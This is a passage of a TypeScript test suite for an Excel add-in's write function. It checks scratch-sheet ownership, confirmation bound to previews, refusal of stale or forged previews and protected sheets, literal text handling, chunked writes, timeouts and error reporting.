    expect(writesIn(f).filter((l) => !/^(add |name |set )/.test(l))).toEqual([]);
  });

  test("reuses the owned sheet: no second sheet, no clear", async () => {
    const { f, run } = setup([{ name: "copilot scratch", names: [SCRATCH_MARK], cells: [["keep"]] }]);
    expect(await applyWrite(run, vals("Data", "B1", [["x"]]), scratch())).toMatchObject({ ok: true });
    expect(f.sheetNames()).toEqual(["copilot scratch"]);
    expect(f.cell(SCRATCH_SHEET, "A1")).toBe("keep");
    expect(f.cell(SCRATCH_SHEET, "B1")).toBe("x");
    expect(f.log.some((l) => l.startsWith("add ") || l.includes(".clear"))).toBe(false);
  });

  test.each(["Copilot Scratch", "copilot scratch", "COPILOT SCRATCH"])("a same-named sheet %j without the marker is never written", async (name) => {
    const { f, run } = setup([{ name, cells: [["user data"]] }]);
    const res = await applyWrite(run, vals("Data", "A1", [["x"]]), scratch());
    expect(res).toEqual({ ok: false, error: `A sheet named 'Copilot Scratch' already exists and wasn't created by this add-in; rename it.`, written: 0 });
    expect(f.cell(name, "A1")).toBe("user data");
    expect(writesIn(f)).toEqual([]);
    expect(touched(f)).toEqual([]);
  });

  test("a hidden or protected owned scratch sheet is refused", async () => {
    for (const [sheet, err] of [[{ visibility: "Hidden" as const }, M.hidden], [{ protected: true }, M.protected]] as const) {
      const { f, run } = setup([{ name: SCRATCH_SHEET, names: [SCRATCH_MARK], ...sheet }]);
      expect(await applyWrite(run, vals("Data", "A1", [["x"]]), scratch())).toEqual({ ok: false, error: err, written: 0 });
      expect(writesIn(f)).toEqual([]);
    }
  });

  test("optional selection selects only the written range on the scratch sheet", async () => {
    const { f, run } = setup();
    await applyWrite(run, vals("Data", "A1:B1", [[1, 2]]), scratch({ select: true }));
    expect(f.log.filter((l) => l.startsWith("activate") || l.startsWith("select"))).toEqual([`activate ${SCRATCH_SHEET}`, `select ${SCRATCH_SHEET}!A1:B1`]);
    const other = setup();
    await applyWrite(other.run, vals("Data", "A1", [[1]]), scratch());
    expect(other.f.log.some((l) => l.startsWith("activate") || l.startsWith("select"))).toBe(false);
  });

  test("formulas are written as formulas; an earlier text format on the owned sheet is reset first", async () => {
    const { f, run } = setup();
    await applyWrite(run, vals("Data", "A1", [["text"]]), scratch());
    expect(f.format(SCRATCH_SHEET, "A1")).toBe("@");
    expect(await applyWrite(run, fmls("Data", "A1:B1", [["=1+1", "=A1"]]), scratch())).toMatchObject({ ok: true, cells: 2 });
    expect(f.cell(SCRATCH_SHEET, "A1")).toEqual({ f: "=1+1" });
    expect(f.cell(SCRATCH_SHEET, "B1")).toEqual({ f: "=A1" });
    expect(f.format(SCRATCH_SHEET, "A1")).toBe("General");
  });
});

describe("values: '@' before values, text stays literal, numbers stay numbers", () => {
  test("number format is set and synced before values", async () => {
    const { f, run } = setup([{ name: "Data" }]);
    const p = vals("Data", "A1:B1", [["-5", 12]]);
    const pv = await preview(run, p);
    f.log.length = 0;
    await applyWrite(run, p, confirmed(pv));
    const nf = f.log.indexOf("set numberFormat Data!A1:B1");
    const v = f.log.indexOf("set values Data!A1:B1");
    expect(nf).toBeGreaterThanOrEqual(0);
    expect(v).toBeGreaterThan(nf);
    expect(f.log.slice(nf, v)).toContain("sync");
  });

  test("=SUM(A1) as a value never reaches Excel: the client policy refuses it, nothing is written", async () => {
    const { f, run } = setup([{ name: "Data" }]);
    for (const v of ["=SUM(A1)", "\uff1dSUM(A1)", " =SUM(A1)", "\u200b=SUM(A1)"]) {
      expect(await applyWrite(run, vals("Data", "A1", [[v]]), scratch())).toEqual({ ok: false, error: M.formulaLike, written: 0 });
    }
    expect(f.runs()).toBe(0);
  });

  test("text Excel would interpret stays literal; numbers and booleans keep their type", async () => {
    const { f, run } = setup([{ name: "Data", formats: { C1: "@", F1: "0.00" } }]);
    const p = vals("Data", "A1:G1", [["-5", "TRUE", 12, true, "1/2/2024", 7, "+3.5"]]);
    const pv = await preview(run, p);
    expect(await applyWrite(run, p, confirmed(pv))).toMatchObject({ ok: true });
    expect(f.cell("Data", "A1")).toBe("-5"); // numeric text stays text
    expect(f.cell("Data", "B1")).toBe("TRUE");
    expect(f.cell("Data", "C1")).toBe(12); // a "@" cell becomes General so 12 is a number
    expect(f.format("Data", "C1")).toBe("General");
    expect(f.cell("Data", "D1")).toBe(true);
    expect(f.cell("Data", "E1")).toBe("1/2/2024");
    expect(f.format("Data", "F1")).toBe("0.00"); // a user's number format is kept
    expect(f.cell("Data", "F1")).toBe(7);
    expect(f.cell("Data", "G1")).toBe("+3.5");
    expect(["A1", "B1", "E1", "G1"].map((a) => f.format("Data", a))).toEqual(["@", "@", "@", "@"]);
  });

  test("with the format step skipped (mutation), '=1+1' text would become a formula: the fake is meaningful", async () => {
    const { f, run } = setup([{ name: SCRATCH_SHEET, names: [SCRATCH_MARK] }]);
    // Direct write without the format: the fake interprets it like Excel would.
    await run(async (ctx: Excel.RequestContext) => {
      const r = ctx.workbook.worksheets.getItemOrNullObject(SCRATCH_SHEET).getRange("A1");
      r.values = [["=1+1"]];
      await ctx.sync();
    });
    expect(f.cell(SCRATCH_SHEET, "A1")).toEqual({ f: "=1+1" });
  });

  test("text written to the scratch sheet is formatted as text, and stays literal", async () => {
    const { f, run } = setup();
    await applyWrite(run, vals("Data", "A1:B1", [["a=b", "x"]]), scratch());
    expect(f.format(SCRATCH_SHEET, "A1")).toBe("@");
    expect(f.cell(SCRATCH_SHEET, "A1")).toBe("a=b");
  });

  test("an empty cell is cleared, not left with old content", async () => {
    const { f, run } = setup([{ name: "Data", cells: [["old"]] }]);
    const pv = await preview(run, vals("Data", "A1", [[null]]));
    await applyWrite(run, vals("Data", "A1", [[null]]), confirmed(pv));
    expect(f.cell("Data", "A1")).toBeUndefined();
  });
});

describe("applyWrite to a range", () => {
  test("needs confirmed === true", async () => {
    const { f, run } = setup([{ name: "Data", cells: [["old"]] }]);
    const pv = await preview(run, vals("Data", "A1", [["new"]]));
    for (const c of [false, undefined, "true", 1]) {
      const res = await applyWrite(run, vals("Data", "A1", [["new"]]), { ...confirmed(pv), confirmed: c } as ApplyOptions);
      expect(res).toEqual({ ok: false, error: M.confirm, written: 0 });
    }
    expect(writesIn(f)).toEqual([]);
    expect(f.cell("Data", "A1")).toBe("old");
  });

  test("writes exactly the target range of the existing sheet", async () => {
    const { f, run } = setup([{ name: "Data", cells: [["a", "b", "c"], ["d", "e", "f"]] }, { name: "Other" }]);
    const p = vals("Data", "B1:C1", [["x", 2]]);
    const pv = await preview(run, p);
    f.log.length = 0;
    expect(await applyWrite(run, p, confirmed(pv))).toEqual({ ok: true, sheet: "Data", range: "B1:C1", cells: 2 });
    expect(f.cell("Data", "A1")).toBe("a");
    expect(f.cell("Data", "B1")).toBe("x");
    expect(f.cell("Data", "C1")).toBe(2);
    expect(f.cell("Data", "B2")).toBe("e");
    expect(new Set(touched(f))).toEqual(new Set(["Data!B1:C1"]));
    expect(writesIn(f)).toEqual(["set numberFormat Data!B1:C1", "set values Data!B1:C1"]);
    expect(f.sheetNames()).toEqual(["Data", "Other"]);
  });

  test("formulas to a confirmed range leave number formats untouched", async () => {
    const { f, run } = setup([{ name: "Data", formats: { A1: "0%" } }]);
    const p = fmls("Data", "A1", [["=1/2"]]);
    const pv = await preview(run, p);
    f.log.length = 0;
    expect(await applyWrite(run, p, confirmed(pv))).toMatchObject({ ok: true });
    expect(writesIn(f)).toEqual(["set formulas Data!A1"]);
    expect(f.cell("Data", "A1")).toEqual({ f: "=1/2" });
  });

  test("refuses when the range changed since the preview (no stale overwrite)", async () => {
    const { f, run } = setup([{ name: "Data", cells: [["old", "x".repeat(800)]] }]);
    const p = vals("Data", "A1:B1", [["new", "y"]]);
    let pv = await preview(run, p);
    f.edit("Data", "A1", "someone else's edit");
    expect(await applyWrite(run, p, confirmed(pv))).toEqual({ ok: false, error: M.stale, written: 0 });
    expect(f.cell("Data", "A1")).toBe("someone else's edit");
    // A change beyond the shown (shortened) text is caught by the stamp.
    pv = await preview(run, p);
    f.edit("Data", "B1", "x".repeat(799) + "z");
    expect(await applyWrite(run, p, confirmed(pv))).toEqual({ ok: false, error: M.stale, written: 0 });
    // A formula replacing a constant with the same shown value is a change too.
    f.edit("Data", "A1", "v");
    pv = await preview(run, p);
    f.edit("Data", "A1", { f: '="v"' });
    expect(await applyWrite(run, p, confirmed(pv))).toEqual({ ok: false, error: M.stale, written: 0 });
    expect(writesIn(f)).toEqual([]);
  });

  test("refuses a preview for another sheet, range, target or kind", async () => {
    const { f, run } = setup([{ name: "Data", cells: [["a", "b"]] }, { name: "Two" }]);
    const p = vals("Data", "A1:B1", [["x", "y"]]);
    const pv = await preview(run, p);
    const other: WritePreview[] = [{ ...pv, range: "A1" }, { ...pv, sheet: "Two" }, { ...pv, target: "scratch" }, { ...pv, kind: "formulas" }, null as never];
    for (const bad of other) expect(await applyWrite(run, p, confirmed(bad))).toEqual({ ok: false, error: M.mismatch, written: 0 });
    expect(writesIn(f)).toEqual([]);
  });

  test("refuses a forged before or stamp", async () => {
    const { f, run } = setup([{ name: "Data", cells: [["a", "b"]] }]);
    const p = vals("Data", "A1:B1", [["x", "y"]]);
    const pv = await preview(run, p);
    const forged: WritePreview[] = [
      { ...pv, before: [["a"]] }, { ...pv, before: [["a", "c"]] }, { ...pv, before: [] }, { ...pv, before: ["ab"] as never }, { ...pv, stamp: "0-0-1" },
    ];
    for (const bad of forged) expect(await applyWrite(run, p, confirmed(bad))).toEqual({ ok: false, error: M.stale, written: 0 });
    expect(writesIn(f)).toEqual([]);
  });

  test("the confirmation covers the content: a different proposal for the same range is refused", async () => {
    const { f, run } = setup([{ name: "Data", cells: [["a", "b"]] }]);
    const harmless = await preview(run, vals("Data", "A1:B1", [["ok", "fine"]]));
    for (const other of [vals("Data", "A1:B1", [["DROP", "fine"]]), vals("Data", "A1:B1", [["ok", null]])]) {
      expect(await applyWrite(run, other, confirmed(harmless))).toEqual({ ok: false, error: M.mismatch, written: 0 });
    }
    // Same shown text, different type: 1 (number) vs "1" (text).
    const asNumber = await preview(run, vals("Data", "A1:B1", [[1, "b"]]));
    expect(asNumber.after).toEqual([["1", "b"]]);
    expect(await applyWrite(run, vals("Data", "A1:B1", [["1", "b"]]), confirmed(asNumber))).toEqual({ ok: false, error: M.mismatch, written: 0 });
    // A tampered after (or afterStamp) on the preview is refused too.
    const p = vals("Data", "A1:B1", [["ok", "fine"]]);
    expect(await applyWrite(run, p, confirmed({ ...harmless, after: [["ok", "FINE"]] }))).toEqual({ ok: false, error: M.mismatch, written: 0 });
    expect(await applyWrite(run, p, confirmed({ ...harmless, afterStamp: "0-0-1" }))).toEqual({ ok: false, error: M.mismatch, written: 0 });
    // Beyond the shown text: a change past cell_char_limit is caught by afterStamp.
    const longA = vals("Data", "A1:B1", [["x".repeat(600), "b"]]);
    const longB = vals("Data", "A1:B1", [["x".repeat(599) + "y", "b"]]);
    expect(await applyWrite(run, longB, confirmed(await preview(run, longA)))).toEqual({ ok: false, error: M.mismatch, written: 0 });
    expect(writesIn(f)).toEqual([]);
    expect(await applyWrite(run, p, confirmed(harmless))).toMatchObject({ ok: true });
  });

  test("the preview is bound to the worksheet: a renamed-and-replaced sheet is refused", async () => {
    const { f, run } = setup([{ name: "Data" }]);
    const p = vals("Data", "A1", [["x"]]);
    const pv = await preview(run, p);
    f.rename("Data", "Old");
    f.addSheet({ name: "Data" }); // identical, empty
    expect(await applyWrite(run, p, confirmed(pv))).toEqual({ ok: false, error: M.stale, written: 0 });
    expect(writesIn(f)).toEqual([]);
  });

  test("merged cells added after the preview are refused at apply", async () => {
    const { f, run } = setup([{ name: "Data" }]);
    const p = vals("Data", "A1:B1", [["x", "y"]]);
    const pv = await preview(run, p);
    const g = setup([{ name: "Data", merged: ["A1:B1"] }]);
    expect(await applyWrite(g.run, p, confirmed({ ...pv, sheetId: g.f.sheetId("Data")! }))).toEqual({ ok: false, error: M.merged, written: 0 });
    expect(writesIn(g.f)).toEqual([]);
    expect(writesIn(f)).toEqual([]);
  });

  test.each(["Onboarding Review", "ONBOARDING REVIEW", "Copilot Scratch", "COPILOT SCRATCH", "copilot scratch"])("refuses reserved sheet %j even when confirmed", async (name) => {
    const { f, run } = setup([{ name: "Onboarding Review" }, { name: "Copilot Scratch", names: [SCRATCH_MARK] }]);
    const p = vals(name, "A1", [["x"]]);
    expect(await applyWrite(run, p, confirmed(await forged(p)))).toEqual({ ok: false, error: M.reserved, written: 0 });
    expect(f.runs()).toBe(0);
  });

  test("refuses hidden, protected and missing sheets; never creates or unprotects a user sheet", async () => {
    const { f, run } = setup([{ name: "Hid", visibility: "Hidden" }, { name: "Very", visibility: "VeryHidden" }, { name: "Locked", protected: true }]);
    for (const [sheet, err] of [["Hid", M.hidden], ["Very", M.hidden], ["Locked", M.protected], ["Nope", M.notFound]]) {
      const p = vals(sheet!, "A1", [["x"]]);
      expect(await applyWrite(run, p, confirmed(await forged(p, f.sheetId(sheet!))))).toEqual({ ok: false, error: err, written: 0 });
    }
    expect(writesIn(f)).toEqual([]);
    expect(touched(f)).toEqual([]);
    expect(f.sheetNames()).toEqual(["Hid", "Very", "Locked"]);
  });

  test("a sheet hidden or protected after the preview is refused at apply", async () => {
    const book: FakeWriteSheet = { name: "Data" };
    const { f, run } = setup([book]);
    const p = vals("Data", "A1", [["x"]]);
    const pv = await preview(run, p);
    const again = setup([{ name: "Data", protected: true }]);
    expect(await applyWrite(again.run, p, confirmed(pv))).toEqual({ ok: false, error: M.protected, written: 0 });
    expect(writesIn(again.f)).toEqual([]);
    expect(writesIn(f)).toEqual([]);
  });
});

describe("chunking, stopping and failures", () => {
  const tall = (n: number) => vals("Data", `A1:B${n}`, Array.from({ length: n }, (_, i) => [`r${i}`, i]));

  test("writes ≤ 500 rows per request", async () => {
    const { f, run } = setup();
    const res = await applyWrite(run, tall(1100), scratch({ limits: lim({ max_write_cells: 2200 }) }));
    expect(res).toEqual({ ok: true, sheet: SCRATCH_SHEET, range: "A1:B1100", cells: 2200 });
    expect(f.log.filter((l) => l.startsWith("set values"))).toEqual([
      `set values ${SCRATCH_SHEET}!A1:B500`, `set values ${SCRATCH_SHEET}!A501:B1000`, `set values ${SCRATCH_SHEET}!A1001:B1100`,
    ]);
    expect(f.cell(SCRATCH_SHEET, "A1100")).toBe("r1099");
    expect(f.cell(SCRATCH_SHEET, "B1100")).toBe(1099);
  });

  test("stopping between chunks keeps what was written and says how much", async () => {
    const { f, run } = setup();
    const c = new AbortController();
    f.onSync(() => {
      if (f.log.filter((l) => l.startsWith("set values")).length === 1 && f.log.at(-2)?.startsWith("set values")) c.abort();
    });
    const res = await applyWrite(run, tall(1100), scratch({ limits: lim({ max_write_cells: 2200 }), signal: c.signal }));
    expect(res).toEqual({ ok: false, error: M.stopped, written: 1000 });
    expect(f.log.filter((l) => l.startsWith("set "))).toEqual([`set numberFormat ${SCRATCH_SHEET}!A1:B500`, `set values ${SCRATCH_SHEET}!A1:B500`]);
    expect(f.cell(SCRATCH_SHEET, "A500")).toBe("r499");
    expect(f.cell(SCRATCH_SHEET, "A501")).toBeUndefined();
  });

  test("an already-aborted signal touches nothing", async () => {
    const { f, run } = setup();
    const c = new AbortController();
    c.abort();
    expect(await applyWrite(run, vals("Data", "A1", [[1]]), scratch({ signal: c.signal }))).toEqual({ ok: false, error: M.stopped, written: 0 });
    expect(f.runs()).toBe(0);
  });

  test("an abort while queued behind another Excel call touches nothing", async () => {
    vi.useFakeTimers();
    const { f, run } = setup();
    const release = f.hold();
    const c = new AbortController();
    const first = applyWrite(run, vals("Data", "A1", [[1]]), scratch());
    const second = applyWrite(run, vals("Data", "A1", [[2]]), scratch({ signal: c.signal }));
    c.abort();
    await vi.advanceTimersByTimeAsync(EXCEL_OP_TIMEOUT_MS + 1);
    expect(await first).toEqual({ ok: false, error: M.busy, written: 0 });
    expect(await second).toMatchObject({ ok: false });
    release();
    await vi.runAllTimersAsync();
    expect(f.runs()).toBe(1);
    expect(f.log).toEqual([]); // the timed-out write does nothing once Excel frees up: no lookup, no new sheet
  });

  test("a mid-write failure is a generic message without Office's text and reports the cells written", async () => {
    const { f, run } = setup();
    let n = 0;
    f.onSync(() => {
      if (f.log.at(-2)?.startsWith("set values") && ++n === 1) f.failSync(2, Object.assign(new Error(`${SENTINEL} in Sheet!A501`), { code: "GeneralException", debugInfo: { message: SENTINEL } }));
    });
    const res = await applyWrite(run, tall(1100), scratch({ limits: lim({ max_write_cells: 2200 }) }));
    expect(res).toEqual({ ok: false, error: M.writeFailed, written: 1000 });
    expect(JSON.stringify(res)).not.toContain(SENTINEL);
  });

  const column = (n: number) => vals("Data", `A1:A${n}`, Array.from({ length: n }, (_, i) => [`r${i}`]));
  /** Stalls the values sync of chunk `k` (1-based); returns the release. */
  function stallChunk(f: Fake, k: number): { release: () => void } {
    const handle = { release: () => undefined as void };
    f.onSync(() => {
      if (f.log.at(-2)?.startsWith("set numberFormat") && f.log.filter((l) => l.startsWith("set numberFormat")).length === k) {
        f.onSync(null);
        handle.release = f.stallSync(1);
      }
    });
    return handle;
  }

  test("a timeout during the write waits for the chunk in flight and reports exactly what was written", async () => {
    vi.useFakeTimers();
    const { f, run } = setup();
    const stall = stallChunk(f, 2);
    const pending = applyWrite(run, column(1100), scratch());
    await vi.advanceTimersByTimeAsync(EXCEL_OP_TIMEOUT_MS + 1); // the timeout fires while chunk 2 is in flight
    stall.release(); // chunk 2 lands
    expect(await pending).toEqual({ ok: false, error: M.busy, written: 1000 });
    await vi.runAllTimersAsync();
    expect(f.log.filter((l) => l.startsWith("set values"))).toHaveLength(2); // nothing after the boundary
    expect(f.cell(SCRATCH_SHEET, "A1000")).toBe("r999");
    expect(f.cell(SCRATCH_SHEET, "A1001")).toBeUndefined();
  });

  test("a write that finishes after the timeout fired reports success", async () => {
    vi.useFakeTimers();
    const { f, run } = setup();
    const stall = stallChunk(f, 3);
    const pending = applyWrite(run, column(1100), scratch());
    await vi.advanceTimersByTimeAsync(EXCEL_OP_TIMEOUT_MS + 1);
    stall.release();
    expect(await pending).toEqual({ ok: true, sheet: SCRATCH_SHEET, range: "A1:A1100", cells: 1100 });
  });

  test("a write that never settles is reported as possibly partly applied, with a lower bound", async () => {
    vi.useFakeTimers();
    const { f, run } = setup();
    const stall = stallChunk(f, 2);
    const pending = applyWrite(run, column(1100), scratch());
    await vi.advanceTimersByTimeAsync(EXCEL_OP_TIMEOUT_MS + WRITE_SETTLE_MS + 2);
    expect(await pending).toEqual({ ok: false, error: "The write may be partly applied; check the range.", written: 500, uncertain: true });
    stall.release(); // Excel frees up: the queue drains and the write stops at the next boundary
    await vi.runAllTimersAsync();
    expect(f.log.filter((l) => l.startsWith("set values"))).toHaveLength(2);
  });

  test("a timeout before any write request is plain busy and writes nothing later", async () => {
    vi.useFakeTimers();
    const { f, run } = setup([{ name: "Data" }]);
    const release = f.stallSync(1); // the first lookup is slow
    const pending = applyWrite(run, column(10), scratch());
    await vi.advanceTimersByTimeAsync(EXCEL_OP_TIMEOUT_MS + 1);
    expect(await pending).toEqual({ ok: false, error: M.busy, written: 0 });
    release();
    await vi.runAllTimersAsync();
    expect(f.log.filter((l) => l.startsWith("set "))).toEqual([]);
  });

  test("chunks are bounded by payload size as well as rows", async () => {
    const { f, run } = setup();
    const big = "x".repeat(30_000);
    // 20 rows x 1 col of 30k chars: at most 6 rows (~180k chars) per request.
    const tallBig = vals("Data", "A1:A20", Array.from({ length: 20 }, () => [big]));
    expect(await applyWrite(run, tallBig, scratch())).toMatchObject({ ok: true, cells: 20 });
    const sets = f.log.filter((l) => l.startsWith("set values"));
    expect(sets).toEqual([`set values ${SCRATCH_SHEET}!A1:A6`, `set values ${SCRATCH_SHEET}!A7:A12`, `set values ${SCRATCH_SHEET}!A13:A18`, `set values ${SCRATCH_SHEET}!A19:A20`]);
    // One row over the budget is split into column runs.
    const g = setup();
    const wide = vals("Data", "A1:J1", [Array.from({ length: 10 }, () => big)]);
    expect(await applyWrite(g.run, wide, scratch())).toMatchObject({ ok: true, cells: 10 });
    expect(g.f.log.filter((l) => l.startsWith("set values"))).toEqual([`set values ${SCRATCH_SHEET}!A1:F1`, `set values ${SCRATCH_SHEET}!G1:J1`]);
    expect(g.f.cell(SCRATCH_SHEET, "J1")).toBe(big);
    // Mixed: small rows around a wide row.
    const h = setup();
    const mixed = vals("Data", "A1:J3", [Array(10).fill("a"), Array.from({ length: 10 }, () => big), Array(10).fill("b")]);
    expect(await applyWrite(h.run, mixed, scratch())).toMatchObject({ ok: true, cells: 30 });
    expect(h.f.log.filter((l) => l.startsWith("set values"))).toEqual([
      `set values ${SCRATCH_SHEET}!A1:J1`, `set values ${SCRATCH_SHEET}!A2:F2`, `set values ${SCRATCH_SHEET}!G2:J2`, `set values ${SCRATCH_SHEET}!A3:J3`,
    ]);
    expect(h.f.cell(SCRATCH_SHEET, "J3")).toBe("b");
  });

  test("Excel refusing to create the scratch sheet is a generic failure", async () => {
    const { f, run } = setup();
    f.failSync(2, Object.assign(new Error(SENTINEL), { code: "GeneralException" }));
    const res = await applyWrite(run, vals("Data", "A1", [[1]]), scratch());
    expect(res).toEqual({ ok: false, error: M.writeFailed, written: 0 });
  });

  test("a sheet deleted during the write reads as not found", async () => {
    const { f, run } = setup();
    f.failSync(1, Object.assign(new Error(SENTINEL), { code: "ItemNotFound" }));
    expect(await applyWrite(run, vals("Data", "A1", [[1]]), scratch())).toEqual({ ok: false, error: M.notFound, written: 0 });
  });
});

describe("never throws", () => {
  test("fuzzed proposals and options always resolve to a result", async () => {
    const { run } = setup([{ name: "Data" }]);
    const junk: unknown[] = [undefined, null, 0, "", "x", [], {}, [[]], [[1]], { a: 1 }, NaN, () => 1, Symbol("s"), [["=1"]], [[null]], "A1", "Data"];
    let seed = 7;
    const pick = () => junk[(seed = (seed * 1103515245 + 12345) % 2 ** 31) % junk.length];
    for (let i = 0; i < 300; i++) {
      const p = { sheet: pick(), range: pick(), values: pick(), formulas: pick(), note: pick() } as unknown as WriteProposal;
      const opts = (i % 3 === 0 ? pick() : { target: i % 2 ? "scratch" : "range", confirmed: pick(), preview: pick(), limits: i % 5 ? LIMITS : pick(), signal: undefined }) as ApplyOptions;
      const a = await applyWrite(run, p, opts);
      expect(typeof a.ok).toBe("boolean");
      const b = await previewWrite(run, p, pick() as CopilotLimits, pick() as "range");
      expect(typeof b.ok).toBe("boolean");
      if (!a.ok) expect(Object.values(M)).toContain(a.error);
      if (!b.ok) expect(Object.values(M)).toContain(b.error);
    }
  });

  test("a throwing run resolves to a generic error", async () => {
    const run = (() => { throw new Error(SENTINEL); }) as unknown as ExcelRun;
    expect(await applyWrite(run, vals("Data", "A1", [[1]]), scratch())).toEqual({ ok: false, error: M.writeFailed, written: 0 });
    expect(await previewWrite(run, vals("Data", "A1", [[1]]), LIMITS)).toEqual({ ok: false, error: M.readFailed });
  });

  test("no console output", async () => {
    const spies = (["log", "warn", "error", "info", "debug"] as const).map((m) => vi.spyOn(console, m));
    const { f, run } = setup();
    f.failSync(1, new Error(SENTINEL));
    await applyWrite(run, vals("Data", "A1", [[1]]), scratch());
    await previewWrite(run, vals("Data", "A1", [[1]]), LIMITS);
    for (const s of spies) expect(s).not.toHaveBeenCalled();
    vi.restoreAllMocks();
  });
});
